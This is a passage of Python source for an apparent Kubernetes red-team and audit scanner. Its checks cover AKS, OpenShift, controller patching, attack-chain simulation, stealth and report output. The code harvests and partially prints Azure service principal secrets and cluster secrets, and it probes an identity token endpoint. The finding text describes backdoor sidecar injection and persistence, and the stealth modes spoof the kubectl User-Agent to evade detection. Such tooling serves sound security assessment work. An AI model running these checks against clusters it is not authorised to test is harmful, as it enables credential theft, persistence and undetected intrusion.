                client_id     = az_cfg.get("aadClientId","") or az_cfg.get("clientId","")
                client_secret = az_cfg.get("aadClientSecret","") or az_cfg.get("clientSecret","")
                tenant        = az_cfg.get("tenantId","")
                sub           = az_cfg.get("subscriptionId","")
                if client_secret:
                    finding("CRITICAL",f"Service Principal credentials in {az_path}",
                            f"ClientID: {client_id} | Secret: {client_secret[:8]}...\n"
                            f"TenantID: {tenant} | SubID: {sub[:8]}...\n"
                            "az login --service-principal -u {clientId} -p {secret} --tenant {tenant}",
                            "Rotate SP credentials immediately | Migrate to Managed Identity")
                    add_attack_edge("Compromised Pod","Azure Subscription",
                                    f"SP credentials in {az_path} → az login","CRITICAL")
                else:
                    finding("HIGH",f"azure.json accessible at {az_path}",
                            f"Contains: {', '.join(az_cfg.keys())}\n"
                            "May use MSI — check for Managed Identity escalation",
                            "Restrict read access to azure.json")
            except:
                finding("HIGH",f"{az_path} readable but not JSON",
                        truncate(content,200),
                        "Review content for credentials | Restrict file access")

    section("AAD Pod Identity (Legacy)")
    code_nmi, resp_nmi = k8s_api("/api/v1/namespaces/kube-system/pods")
    if code_nmi == 200 and resp_nmi:
        nmi_pods = [p for p in resp_nmi.get("items",[])
                    if "nmi" in p["metadata"]["name"].lower() or
                       "aad-pod-identity" in p["metadata"]["name"].lower()]
        if nmi_pods:
            finding("HIGH","AAD Pod Identity (legacy) NMI DaemonSet detected",
                    f"NMI pods: {', '.join([p['metadata']['name'] for p in nmi_pods])}\n"
                    "Pods can request tokens without Kubernetes-level auth check via NMI",
                    "Migrate to Workload Identity | Restrict AzureIdentity CRD access")
            # Test unauthenticated NMI endpoint
            code_nmi_tok, _ = http_get(
                "http://127.0.0.1:2579/metadata/identity/oauth2/token?resource=https://management.azure.com/",
                headers={"podname":"test","podns":"default"}, timeout=2)
            if code_nmi_tok == 200:
                finding("CRITICAL","AAD Pod Identity NMI token endpoint accessible — unauthenticated",
                        "Port 2579 responds to token requests without pod validation",
                        "Upgrade to Workload Identity immediately")
                add_attack_edge("Compromised Pod","Azure AD","NMI unauthenticated token → Azure","CRITICAL")

    section("AKS SP Secret in kube-system")
    code_sp, resp_sp = k8s_api("/api/v1/namespaces/kube-system/secrets")
    if code_sp == 200 and resp_sp:
        sp_secrets = [s for s in resp_sp.get("items",[])
                      if "service-principal" in s["metadata"]["name"].lower() or
                         "azurespn" in s["metadata"]["name"].lower() or
                         "azure" in s["metadata"]["name"].lower()]
        if sp_secrets:
            for sp in sp_secrets[:3]:
                data = sp.get("data",{})
                client_secret = data.get("clientSecret","") or data.get("secret","")
                if client_secret:
                    finding("CRITICAL",f"AKS SP secret in kube-system: {sp['metadata']['name']}",
                            f"clientSecret: {decode_b64(client_secret)[:20]}...",
                            "Rotate SP credentials | Migrate to Managed Identity")

# ══════════════════════════════════════════════════════════════════
# PHASE 21: OPENSHIFT / OKD
# ══════════════════════════════════════════════════════════════════
def phase_openshift():
    global CURRENT_PHASE
    CURRENT_PHASE = "21"
    phase_header("21","OpenShift / OKD Tests",
                 "SCC enumeration, OAuth, internal registry, routes, OpenShift RBAC")

    # Detect OpenShift
    code_oc, resp_oc = k8s_api("/apis/security.openshift.io/v1/securitycontextconstraints")
    is_openshift = (code_oc in (200,403))
    if not is_openshift:
        finding("INFO","Not OpenShift — SCC API not present","")
        return

    section("SecurityContextConstraints Enumeration")
    if code_oc == 200 and resp_oc:
        sccs = resp_oc.get("items",[])
        dangerous_sccs = [s["metadata"]["name"] for s in sccs
                          if s["metadata"]["name"] in ("anyuid","privileged","hostmount-anyuid","hostaccess","hostnetwork")]
        if dangerous_sccs:
            finding("HIGH",f"Dangerous SCCs exist: {', '.join(dangerous_sccs)}",
                    "anyuid = run as any UID | privileged = full node access",
                    "Audit SCC assignments | Remove anyuid/privileged from non-admin SAs")
        finding("INFO",f"SCCs enumerated: {len(sccs)}",
                f"SCCs: {', '.join([s['metadata']['name'] for s in sccs[:8]])}")

    section("Current Pod SCC Detection")
    _, scc_out, _ = run_cmd("cat /proc/self/attr/current 2>/dev/null")
    if scc_out:
        if "privileged" in scc_out.lower() or "anyuid" in scc_out.lower():
            finding("CRITICAL",f"Pod running under dangerous SCC: {scc_out}",
                    "privileged or anyuid SCC = equivalent to PSS Privileged",
                    "Assign restricted SCC | Remove anyuid from SA")
            add_attack_edge("Compromised Pod","Node Root","anyuid/privileged SCC → host escape","CRITICAL")
        else:
            finding("INFO",f"Current SCC: {scc_out}","")

    section("SA SCC Permission Check")
    sa  = CTX.get("sa_name","default")
    ns  = CTX.get("namespace","default")
    code_sa_scc, resp_sa_scc = k8s_api(
        f"/apis/authorization.openshift.io/v1/subjectaccessreviews",
        method="POST",
        data={"apiVersion":"authorization.openshift.io/v1","kind":"SubjectAccessReview",
              "spec":{"user":f"system:serviceaccount:{ns}:{sa}",
                      "groups":[],
                      "resource":{"resource":"securitycontextconstraints",
                                  "verb":"use","group":"security.openshift.io"}}})
    if code_sa_scc == 201 and resp_sa_scc:
        allowed = resp_sa_scc.get("status",{}).get("allowed",False)
        if allowed:
            finding("HIGH",f"SA {ns}/{sa} can use SCCs",
                    "Can escalate privileges by requesting higher SCC",
                    "Audit SCC use permissions | Apply OPA/Kyverno restrictions")

    section("OpenShift Route Enumeration")
    code_rt, resp_rt = k8s_api("/apis/route.openshift.io/v1/routes")
    if code_rt == 200 and resp_rt:
        routes = resp_rt.get("items",[])
        internal_routes = [r for r in routes
                           if "internal" in r.get("spec",{}).get("host","").lower() or
                              "admin" in r.get("spec",{}).get("host","").lower()]
        finding("INFO",f"OpenShift Routes enumerated: {len(routes)}",
                f"Routes: {', '.join([r['spec']['host'] for r in routes[:6]])}\n"
                f"Internal/admin routes: {len(internal_routes)}",
                "Review exposed routes | Apply OpenShift NetworkPolicy")
        if internal_routes:
            finding("MEDIUM","Admin/internal routes exposed via OpenShift Router",
                    "\n".join([r["spec"]["host"] for r in internal_routes[:5]]),
                    "Restrict route access | Apply authentication on internal routes")

    section("OpenShift Internal Registry")
    code_reg, resp_reg = k8s_api("/api/v1/namespaces/openshift-image-registry/services")
    if code_reg == 200 and resp_reg and resp_reg.get("items"):
        finding("INFO","OpenShift internal registry detected",
                "Accessible at: image-registry.openshift-image-registry.svc:5000\n"
                "image-puller SA may have pull secrets worth stealing",
                "Audit image-puller SA token permissions")
        # Try to read image-puller token
        code_ip, resp_ip = k8s_api("/api/v1/namespaces/openshift-image-registry/secrets")
        if code_ip == 200 and resp_ip:
            pull_secrets = [s for s in resp_ip.get("items",[])
                            if "puller" in s["metadata"]["name"].lower() or
                               "push" in s["metadata"]["name"].lower()]
            if pull_secrets:
                finding("HIGH","OpenShift image registry pull/push secrets accessible",
                        f"Secrets: {', '.join([s['metadata']['name'] for s in pull_secrets[:5]])}",
                        "Restrict registry secret access | Rotate registry credentials")

    section("OpenShift OAuth Token Probe")
    code_oauth, _ = http_get(CTX["api"] + "/oauth/token/request", timeout=3)
    if code_oauth in (200,302):
        finding("INFO","OpenShift OAuth endpoint reachable",
                "Browser-based token request endpoint accessible",
                "Restrict OAuth token request endpoint if not needed")

    section("OpenShift Namespace Enumeration")
    code_ons, resp_ons = k8s_api("/apis/project.openshift.io/v1/projects")
    if code_ons == 200 and resp_ons:
        projects = resp_ons.get("items",[])
        sensitive = [p["metadata"]["name"] for p in projects
                     if any(kw in p["metadata"]["name"] for kw in
                            ["openshift","kube-system","production","prod","finance","payment"])]
        finding("INFO",f"OpenShift Projects enumerated: {len(projects)}",
                f"Sensitive: {', '.join(sensitive[:6])}",
                "Restrict project list to required namespaces only")

# ══════════════════════════════════════════════════════════════════
# PHASE 22: ADVANCED ATTACK TECHNIQUES
# ══════════════════════════════════════════════════════════════════
def phase_advanced():
    global CURRENT_PHASE
    CURRENT_PHASE = "22"
    phase_header("22","Advanced Red Team Techniques",
                 "/proc harvest, DNS poisoning risk, service account token projection, scheduler abuse")

    ns = CTX.get("namespace","default")

    section("SA Token Audience Abuse")
    token = CTX.get("token","")
    if token:
        jwt = decode_jwt(token)
        aud = jwt.get("aud",[])
        iss = jwt.get("iss","")
        if not aud:
            finding("HIGH","SA token has no audience — potential token replay",
                    f"iss: {iss}\nNo aud claim → token may be accepted by other services",
                    "Use bound tokens with explicit audience | Upgrade K8s >= 1.21")
        elif isinstance(aud, list) and len(aud) == 1 and "kubernetes.default.svc" in aud[0]:
            finding("PASS","SA token audience correctly scoped",f"aud: {aud}")
        else:
            finding("MEDIUM","Broad SA token audience",
                    f"aud: {aud}\nToken may be accepted beyond the API server",
                    "Configure TokenRequest with specific audience per workload")

    section("DNS Cache Poisoning Risk")
    # Check if pod has NET_ADMIN or NET_RAW — could respond to DNS faster than CoreDNS
    cap_data = file_read("/proc/self/status") or ""
    cap_eff  = ""
    for line in cap_data.split("\n"):
        if line.startswith("CapEff:"): cap_eff = line.split()[1]; break
    if cap_eff:
        cap_int = int(cap_eff, 16)
        NET_ADMIN = (1 << 12)
        NET_RAW   = (1 << 13)
        if cap_int & NET_ADMIN:
            finding("HIGH","NET_ADMIN capability — DNS poisoning possible",
                    "Pod can modify routing tables, run DHCP server, intercept DNS\n"
                    "Can respond to DNS queries faster than CoreDNS → redirect traffic",
                    "Drop NET_ADMIN capability | Enable Istio mTLS")
            add_attack_edge("Compromised Pod","Other Pods","DNS poisoning via NET_ADMIN","HIGH")
        if cap_int & NET_RAW:
            finding("HIGH","NET_RAW capability — raw packet injection possible",
                    "Can forge ARP responses, inject raw packets, sniff traffic",
                    "Drop NET_RAW capability | Apply NetworkPolicy + mTLS")

    section("Kubernetes Controller Hijacking Check")
    # Check which controllers we can patch
    controller_paths = [
        (f"/apis/apps/v1/namespaces/{ns}/deployments",   "Deployments"),
        (f"/apis/apps/v1/namespaces/{ns}/statefulsets",  "StatefulSets"),
        (f"/apis/apps/v1/namespaces/{ns}/daemonsets",    "DaemonSets"),
        (f"/apis/batch/v1/namespaces/{ns}/cronjobs",     "CronJobs"),
    ]
    hijackable = []
    for list_path, ctrl_type in controller_paths:
        code_l, resp_l = k8s_api(list_path)
        if code_l == 200 and resp_l:
            items = resp_l.get("items",[])
            if items:
                first = items[0]["metadata"]["name"]
                code_p, _ = k8s_api(f"{list_path}/{first}", method="PATCH",
                                     data=[{"op":"test","path":"/metadata/name","value":first}])
                if code_p in (200,204):
                    hijackable.append(f"{ctrl_type}: {first}")
    if hijackable:
        finding("HIGH","Controller hijacking possible — can inject malicious sidecars",
                f"Patchable: {', '.join(hijackable)}\n"
                "Inject: image: attacker/backdoor:latest or malicious command override\n"
                "App continues to run normally — stealth persistence",
                "Remove patch/update verbs from SA RBAC | Use Kyverno to block image changes")
        add_attack_edge("SA Token","Stealth Persistence","Controller patch → malicious sidecar injection","HIGH")

    section("Token Privilege Comparison (Namespace vs Cluster)")
    # Check current token scope
    code_all, _ = k8s_api("/api/v1/secrets")
    code_ns, _  = k8s_api(f"/api/v1/namespaces/{ns}/secrets")
    if code_all == 200:
        finding("CRITICAL","Token has CLUSTER-WIDE secret access",
                "Highest privilege level for secret access",
                "Restrict to namespace-scoped roles only")
    elif code_ns == 200:
        finding("HIGH","Token has namespace-scoped secret access",
                f"Limited to: {ns}",
                "Remove secret read from SA RBAC if not required")

# ══════════════════════════════════════════════════════════════════
# PHASE 23: REAL-WORLD ATTACK CHAIN SIMULATION
# ══════════════════════════════════════════════════════════════════
def phase_attack_chains():
    global CURRENT_PHASE
    CURRENT_PHASE = "23"
    phase_header("23","Real-World Attack Chain Simulation",
                 "Tesla-style IMDS breach, RBAC→Node, SA token privilege ranking, webhook bypass")

    section("Chain 1: Pod RCE → Cloud Credentials → Cloud Account")
    cloud = CTX.get("cloud","Unknown")
    step1 = CTX.get("token","") != ""
    step2 = (cloud == "AWS" and CTX.get("aws_creds")) or cloud in ("GKE","Azure")
    if step1:
        info_line("✓ Step 1: SA token present (Pod RCE → token access)")
    else:
        info_line("✗ Step 1: No SA token")
    if step2:
        info_line(f"✓ Step 2: Cloud credentials accessible via IMDS ({cloud})")
        info_line("✓ Step 3: Full cloud account compromise possible")
        finding("CRITICAL","Attack Chain COMPLETE: Pod RCE → Cloud Account Compromise",
                f"Path: Pod RCE → SA Token → {cloud} IMDS → IAM Credentials → Full Cloud Access\n"
                "Similar to Tesla Kubernetes breach (2018) — cryptomining on cloud account\n"
                "Mitigations needed at every step of this chain",
                "Block IMDS | Remove cloud-platform scope | Restrict SA token")
        add_attack_edge("Pod RCE","Cloud Account Compromise",
                        f"SA Token → {cloud} IMDS → IAM creds","CRITICAL")
    else:
        info_line(f"✗ Step 2: Cloud credentials NOT accessible ({cloud})")
        finding("PASS","Chain 1: Cloud credential path blocked","IMDS not reachable or no token")

    section("Chain 2: RBAC Misconfiguration → Privileged Pod → Node Root")
    can_list_secrets = any(
        f["severity"] == "CRITICAL" and "secrets" in f["check"].lower()
        for f in FINDINGS)
    can_create_pods = any(
        "create pods" in f["check"].lower() or "privileged pod" in f["check"].lower()
        for f in FINDINGS if f["severity"] in ("CRITICAL","HIGH"))
    if can_list_secrets:
        info_line("✓ Step 1: Can list/read secrets (RBAC misconfiguration)")
    if can_create_pods:
        info_line("✓ Step 2: Can create privileged pods")
        info_line("✓ Step 3: Privileged pod → hostPath: / → node root")
        finding("CRITICAL","Attack Chain COMPLETE: RBAC → Privileged Pod → Node Root",
                "Path: Over-permissive RBAC → Create privileged pod with hostPath: / → chroot node\n"
                "→ Read /host/var/lib/kubelet/pods/*/token → pivot to other namespaces\n"
                "Most common Kubernetes privilege escalation pattern",
                "Apply PSS Restricted | Restrict pod create from SA | Deploy Kyverno")
        add_attack_edge("RBAC Misconfiguration","Node Root",
                        "Pod create → hostPath: / → chroot","CRITICAL")
    else:
        finding("PASS","Chain 2: Privileged pod creation blocked","PSS or RBAC restricting pod create")

    section("Chain 3: SA Token Theft → Cluster Admin Takeover")
    stolen_tokens = [f for f in FINDINGS if "stolen token" in f["check"].lower() and
                     f["severity"] == "CRITICAL"]
    wildcard_rbac = any("wildcard rbac" in f["check"].lower() for f in FINDINGS
                        if f["severity"] == "CRITICAL")
    if stolen_tokens:
        info_line("✓ Step 1: SA tokens stolen from /var/lib/kubelet/pods")
    if wildcard_rbac:
        info_line("✓ Step 2: Wildcard RBAC on one of the tokens")
        finding("CRITICAL","Attack Chain COMPLETE: Token Theft → Cluster Admin",
                "Path: hostPath mount → steal SA tokens → find wildcard RBAC token → cluster-admin\n"
                "→ Create backdoor ClusterRoleBinding → permanent access even after token rotation\n"
                "Similar to real-world K8s cluster takeovers",
                "Remove hostPath | PSS Restricted | No wildcard RBAC | Audit token permissions")
        add_attack_edge("Node Access","Permanent Cluster Admin",
                        "Token theft → wildcard RBAC → backdoor CRB","CRITICAL")
    else:
        finding("PASS","Chain 3: Token theft chain blocked","No stolen tokens with wildcard RBAC")

    section("Chain 4: Webhook Bypass → Policy Bypass → Node Escape")
    webhook_bypass = any("ignore" in f["check"].lower() and "unreachable" in f["detail"].lower()
                         for f in FINDINGS if f["severity"] == "CRITICAL")
    if webhook_bypass:
        finding("CRITICAL","Attack Chain COMPLETE: Webhook Bypass → Unconstrained Pod Creation",
                "Path: Webhook failurePolicy=Ignore + service unreachable → policies bypass\n"
                "→ Create privileged pod → node root\n"
                "Kyverno/OPA policies provide zero protection when webhook is down",
                "Set failurePolicy: Fail | Ensure webhook HA | Test webhook failure scenarios")
        add_attack_edge("Webhook Failure","Node Root","Policy bypass → privileged pod","CRITICAL")
    else:
        finding("PASS","Chain 4: No webhook bypass path identified","")

# ══════════════════════════════════════════════════════════════════
# PHASE 24: STEALTH & EVASION ANALYSIS
# ══════════════════════════════════════════════════════════════════
def phase_stealth_analysis():
    global CURRENT_PHASE
    CURRENT_PHASE = "24"
    phase_header("24","Stealth & Evasion Analysis",
                 "Detection surface, audit log events, SIEM gaps, evasion recommendations")

    section("Audit Log Event Classification")
    print(f"  {c(C.GRAY,'This scan generated the following API calls by audit impact:')}\n")

    silent_checks = [
        "File reads (/proc, /sys, /var/run/secrets)",
        "Environment variable inspection",
        "Local port probing (socket.connect)",
        "DNS resolution",
        "Container capability checks",
        "Filesystem write test",
    ]
    logged_checks = [
        "GET /api/v1/* — all list/get operations",
        "POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
        "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
        "GET /version, /api, /apis",
    ]
    mutating_checks = [
        "POST /api/v1/namespaces/{ns}/pods — test pod creation",
        "POST /apis/rbac.../clusterrolebindings — test CRB creation",
        "DELETE — cleanup of created resources",
        "POST /api/v1/namespaces/{ns}/serviceaccounts — in kube-system",
    ]

    finding("INFO","Silent checks (no audit log entry)","\n".join(silent_checks))
    finding("MEDIUM","Logged API calls (appear in audit logs — LOW risk detection)",
            "\n".join(logged_checks),
            "Use --stealth 1 to add jitter and kubectl User-Agent")
    if CTX.get("no_mutate"):
        finding("PASS","Mutating API calls skipped (--no-mutate active)",
                "No POST/PATCH/DELETE calls made\nZero write operations in audit log")
    else:
        finding("HIGH","Mutating API calls were made during this scan",
                "\n".join(mutating_checks) + "\n"
                "These appear in K8s audit logs as create/delete by this SA",
                "Re-run with --no-mutate flag for zero write-operation scans")

    section("Detection Tools Present")
    runtime_tools = CTX.get("runtime_tools", None)
    # Determine from findings if we could not populate CTX (Phase 12 skipped)
    if runtime_tools is None:
        has_no_runtime = any("No runtime security tooling" in f["check"] for f in FINDINGS)
        has_runtime    = any("Runtime security:" in f["check"] or
                             "Tetragon TracingPolicies active" in f["check"] or
                             "Kyverno" in f["check"]
                             for f in FINDINGS)
        runtime_tools  = [] if has_no_runtime else (["unknown"] if has_runtime else [])

    if not runtime_tools:
        finding("INFO","No runtime detection tools found — scan was NOT detected",
                "Tetragon, Falco, Kyverno, Istio not detected\n"
                "All API calls, file reads, and probes went undetected",
                "Install Tetragon (eBPF enforcement) + Falco (alerting)")
    else:
        tools_str = ", ".join(t for t in runtime_tools if t != "unknown")
        finding("INFO",f"Runtime tools present: {tools_str or 'detected'} — scan may have been logged",
                "Review Falco/Tetragon alerts for scan activity\n"
                f"Tools active: {tools_str}",
                "Correlate scan timestamps with runtime alerts and audit logs")

    section("Stealth Recommendations")
    stealth_level = CTX.get("stealth", 0)
    if stealth_level == 0:
        finding("INFO","Running in stealth level 0 (default)",
                "All checks run at full speed | Python urllib User-Agent | No jitter\n"
                "Re-run with --stealth 1 or --stealth 2 for lower detection profile",
                "Use --stealth 2 --no-mutate for production cluster assessments")
    elif stealth_level == 1:
        finding("PASS","Stealth level 1 active",
                "kubectl User-Agent spoofing | Timing jitter (0.3–2s) | Non-mutating mode")
    elif stealth_level >= 2:
        finding("PASS","Stealth level 2 active",
                "Full evasion mode | Read-only inference | Batched API calls | Maximum jitter")

# ══════════════════════════════════════════════════════════════════
# PHASE 25: NETWORK PLUGIN & MISCELLANEOUS CHECKS
# ══════════════════════════════════════════════════════════════════
def phase_misc():
    global CURRENT_PHASE
    CURRENT_PHASE = "25"
    phase_header("25","Network Plugin & Miscellaneous Checks",
                 "CNI detection, kube-proxy, CA reuse, service account settings cluster-wide")

    section("CNI / Network Plugin Detection")
    cni_hints = {
        "calico":  ["/etc/cni/net.d/10-calico.conflist","/etc/calico"],
        "cilium":  ["/etc/cni/net.d/05-cilium.conf","/sys/fs/bpf/tc"],
        "weave":   ["/etc/cni/net.d/10-weave.conf"],
        "flannel": ["/etc/cni/net.d/10-flannel.conf","/run/flannel"],
        "canal":   ["/etc/cni/net.d/10-canal.conf"],
    }
    detected_cni = []
    for cni, paths in cni_hints.items():
        if any(os.path.exists(p) for p in paths):
            detected_cni.append(cni)
    # Also check pods
    for pod in (CTX.get("all_pods") or []):
        for c in pod.get("spec",{}).get("containers",[]):
            img = c.get("image","").lower()
            for cni in ["calico","cilium","weave","flannel"]:
                if cni in img and cni not in detected_cni:
                    detected_cni.append(cni)
    if detected_cni:
        finding("INFO",f"CNI detected: {', '.join(detected_cni)}",
                "Network plugin determines available attack paths:\n"
                "Calico: GlobalNetworkPolicy available for IMDS blocking\n"
                "Cilium: eBPF enforcement | Weave: limited isolation")
    else:
        finding("INFO","CNI not detected from pod","Filesystem not exposing CNI config")

    section("kube-proxy Mode")
    code_kp, resp_kp = k8s_api("/api/v1/namespaces/kube-system/configmaps/kube-proxy")
    if code_kp == 200 and resp_kp:
        data = resp_kp.get("data",{})
        cfg  = data.get("config.conf","") or data.get("kubeconfig.conf","")
        if "iptables" in cfg:
            finding("INFO","kube-proxy mode: iptables","Standard mode")
        elif "ipvs" in cfg:
            finding("INFO","kube-proxy mode: ipvs","IPVS mode — different lateral movement patterns")
        elif "ebpf" in cfg.lower():
            finding("INFO","kube-proxy replacement: eBPF (Cilium)","")

    section("Cluster-Wide automountServiceAccountToken")
    over_mounted = []
    for pod in (CTX.get("all_pods") or []):
        spec = pod.get("spec",{})
        meta = pod.get("metadata",{})
        if spec.get("automountServiceAccountToken") != False:
            over_mounted.append(f"{meta.get('namespace','')}/{meta.get('name','')}")
    if over_mounted:
        finding("MEDIUM",f"{len(over_mounted)} pods auto-mount SA tokens (potential default)",
                f"Sample: {', '.join(over_mounted[:6])}\n"
                "Every compromised pod becomes a K8s API auth point",
                "Set automountServiceAccountToken: false on all pods that don't need K8s API access")
    elif CTX.get("all_pods"):
        finding("PASS","All pods explicitly disable SA token auto-mount","")

    section("Service Account Default Tokens")
    code_sa, resp_sa = k8s_api(f"/api/v1/namespaces/{CTX.get('namespace','default')}/serviceaccounts")
    if code_sa == 200 and resp_sa:
        default_sas = [sa for sa in resp_sa.get("items",[])
                       if sa["metadata"]["name"] == "default"]
        if default_sas:
            sa_spec = default_sas[0]
            if sa_spec.get("automountServiceAccountToken") != False:
                finding("MEDIUM","'default' SA has automountServiceAccountToken not explicitly false",
                        "Pods using default SA inherit token mounting",
                        "kubectl patch sa default -p '{\"automountServiceAccountToken\":false}'")
            else:
                finding("PASS","'default' SA has automountServiceAccountToken: false","")

# ══════════════════════════════════════════════════════════════════
# PHASE 26: DIFF, REPORTING & FINALIZATION
# ══════════════════════════════════════════════════════════════════
def phase_reporting(diff_file=None):
    global CURRENT_PHASE
    CURRENT_PHASE = "26"
    phase_header("26","Diff Analysis & Report Finalization",
                 "Compare with previous scan, new/fixed/changed findings")

    if not diff_file:
        finding("INFO","No previous scan provided for diff","Use --diff previous.json to compare")
        return

    section("Diff vs Previous Scan")
    try:
        with open(diff_file) as f:
            prev = json.load(f)
        prev_findings = {f["check"]: f for f in prev.get("findings",[])}
        curr_findings = {f["check"]: f for f in FINDINGS}

        new_findings     = [f for k,f in curr_findings.items() if k not in prev_findings
                            and f["severity"] not in ("PASS","INFO")]
        fixed_findings   = [f for k,f in prev_findings.items() if k not in curr_findings
                            and f["severity"] not in ("PASS","INFO")]
        changed_findings = []
        for k in curr_findings:
            if k in prev_findings:
                if curr_findings[k]["severity"] != prev_findings[k]["severity"]:
                    changed_findings.append((prev_findings[k], curr_findings[k]))

        print(f"\n  {c(C.BOLD,'Diff Summary:')}")
        print(f"  {c(C.RED,   f'[NEW    ] +{len(new_findings):3} findings')} — regressions")
        print(f"  {c(C.GREEN, f'[FIXED  ] -{len(fixed_findings):3} findings')} — improvements")
        print(f"  {c(C.YELLOW,f'[CHANGED]  {len(changed_findings):3} findings')} — severity changes")

        if new_findings:
            finding("HIGH",f"NEW findings since last scan: {len(new_findings)}",
                    "\n".join([f"[{f['severity']}] {f['check']}" for f in new_findings[:8]]),
                    "Investigate regressions — these are new vulnerabilities")
        if fixed_findings:
            finding("PASS",f"FIXED since last scan: {len(fixed_findings)}",
                    "\n".join([f"[{f['severity']}] {f['check']}" for f in fixed_findings[:8]]))
        for prev_f, curr_f in changed_findings[:5]:
            finding("MEDIUM",f"Severity CHANGED: {curr_f['check']}",
                    f"{prev_f['severity']} → {curr_f['severity']}",
                    "Review why severity changed")

        # CI/CD gate
        critical_new = [f for f in new_findings if f["severity"] == "CRITICAL"]
        high_new     = [f for f in new_findings if f["severity"] == "HIGH"]
        if critical_new or high_new:
            finding("CRITICAL",f"CI/CD GATE FAILURE: {len(critical_new)} new CRITICAL, {len(high_new)} new HIGH",
                    "New CRITICAL/HIGH findings since last scan — pipeline should fail",
                    "Fix new findings before merging | Use --no-mutate in CI pipeline")
            CTX["ci_fail"] = True
        else:
            finding("PASS","CI/CD gate: No new CRITICAL/HIGH findings","")

    except FileNotFoundError:
        finding("INFO",f"Diff file not found: {diff_file}","")
    except Exception as e:
        finding("INFO",f"Diff error: {e}","")

# ══════════════════════════════════════════════════════════════════
# REPORTING: HTML, SARIF, JSON, TXT
# ══════════════════════════════════════════════════════════════════
def save_report(filepath):
    ext = filepath.rsplit(".",1)[-1].lower()
    if ext == "json":
        _save_json(filepath)
    elif ext == "html":
        _save_html(filepath)
    elif ext == "sarif":
        _save_sarif(filepath)
    else:
        _save_txt(filepath)
    print(f"\n  {c(C.GREEN,'✓')} Report saved: {filepath}")

def _save_json(filepath):
    report = {
        "tool": "KubeXHunt", "version": "1.2.0",
        "timestamp": datetime.now().isoformat(),
        "context": {
            "api": CTX.get("api"), "namespace": CTX.get("namespace"),
            "sa": CTX.get("sa_name"), "cloud": CTX.get("cloud"),
            "k8s_version": CTX.get("k8s_version",""),
        },
        "findings": FINDINGS,
        "attack_paths": ATTACK_GRAPH,
        "token_scores": TOKEN_SCORES,
        "summary": {
            sev: len([f for f in FINDINGS if f["severity"] == sev])
            for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO","PASS"]
        }
    }
    with open(filepath,"w") as f:
        json.dump(report, f, indent=2)

def _save_sarif(filepath):
    rules = []
    results = []
    seen_rules = set()

    for i, fnd in enumerate(FINDINGS):
        if fnd["severity"] in ("PASS","INFO"): continue
        rule_id = re.sub(r'[^a-zA-Z0-9]', '', fnd["check"])[:32] or f"RULE{i}"
        if rule_id not in seen_rules:
            seen_rules.add(rule_id)
            # Map to MITRE ATT&CK
            mitre = MITRE_MAP.get(fnd["severity"], [])
            rules.append({
                "id": rule_id,
                "name": fnd["check"][:60],
                "shortDescription": {"text": fnd["check"][:80]},
                "fullDescription": {"text": fnd["detail"][:300]},
                "helpUri": "https://github.com/mayank-choubey/kubexhunt",
                "properties": {
                    "tags": mitre + [fnd["severity"], f"Phase-{fnd['phase']}"],
                    "security-severity": {
                        "CRITICAL":"9.8","HIGH":"7.5","MEDIUM":"5.0","LOW":"2.0"
                    }.get(fnd["severity"],"0.0")
                }
            })
        results.append({
            "ruleId": rule_id,
            "level": {"CRITICAL":"error","HIGH":"error","MEDIUM":"warning","LOW":"note"}.get(fnd["severity"],"note"),
            "message": {"text": f"{fnd['check']}\n{fnd['detail'][:200]}"},
            "locations": [{"physicalLocation": {"artifactLocation": {"uri": "kubernetes-cluster"}}}],
            "properties": {
                "severity": fnd["severity"],
                "phase": fnd["phase"],
                "remediation": fnd["remediation"][:200],
            }
        })

    sarif = {
        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "KubeXHunt",
                    "version": "1.2.0",
                    "informationUri": "https://github.com/mayank-choubey/kubexhunt",
                    "rules": rules,
                }
            },
            "results": results,
            "properties": {
                "cluster": CTX.get("api",""),
                "namespace": CTX.get("namespace",""),
                "k8s_version": CTX.get("k8s_version",""),
            }
        }]
    }
    with open(filepath,"w") as f:
        json.dump(sarif, f, indent=2)

def _save_html(filepath):
    counts = {s: len([f for f in FINDINGS if f["severity"]==s])
              for s in ["CRITICAL","HIGH","MEDIUM","LOW","PASS","INFO"]}
    total_issues = counts["CRITICAL"]+counts["HIGH"]+counts["MEDIUM"]+counts["LOW"]

    # Attack path HTML
    path_html = ""
    if ATTACK_GRAPH:
        path_html = "<h2 style='color:#f44'>⚔ Attack Paths</h2>"
        chains = []
        visited = set()
        for edge in ATTACK_GRAPH:
            if edge["from"] not in visited:
                chain = [edge]
                nxt = edge["to"]; visited.add(edge["from"])
                for e2 in ATTACK_GRAPH:
                    if e2["from"] == nxt and e2["from"] not in visited:
                        chain.append(e2); visited.add(e2["from"]); nxt = e2["to"]
                chains.append(chain)
        for i, chain in enumerate(chains[:5],1):
            col = "#f44" if any(e["severity"]=="CRITICAL" for e in chain) else "#fa0"
            path_html += f"<div class='attack-path'><h3 style='color:{col}'>Attack Path #{i}</h3>"
            path_html += f"<div class='node'>{chain[0]['from']}</div>"
            for edge in chain:
                path_html += f"<div class='arrow'>↓ <span class='via'>{edge['via']}</span></div>"
                path_html += f"<div class='node'>{edge['to']}</div>"
            path_html += "</div>"

    # Findings HTML
    findings_html = ""
    current_phase = None
    sev_colors = {"CRITICAL":"#c62828","HIGH":"#e65100","MEDIUM":"#f57c00",
                  "LOW":"#1565c0","INFO":"#00838f","PASS":"#2e7d32"}
    for fnd in FINDINGS:
        if fnd["phase"] != current_phase:
            if current_phase is not None: findings_html += "</details>"
            current_phase = fnd["phase"]
            findings_html += f"<details open><summary class='phase-header'>Phase {fnd['phase']}</summary>"
        col = sev_colors.get(fnd["severity"],"#666")
        findings_html += f"""
        <div class='finding' style='border-left:4px solid {col}'>
          <div class='finding-header'>
            <span class='severity' style='background:{col}'>{fnd['severity']}</span>
            <strong>{fnd['check']}</strong>
          </div>
          <div class='detail'>{fnd['detail'][:400].replace(chr(10),'<br>')}</div>
          {'<div class="remediation">⚑ ' + fnd["remediation"][:200] + '</div>' if fnd.get("remediation") and fnd["severity"] not in ("PASS","INFO") else ''}
        </div>"""
    if current_phase is not None: findings_html += "</details>"

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>KubeXHunt Security Report</title>
<style>
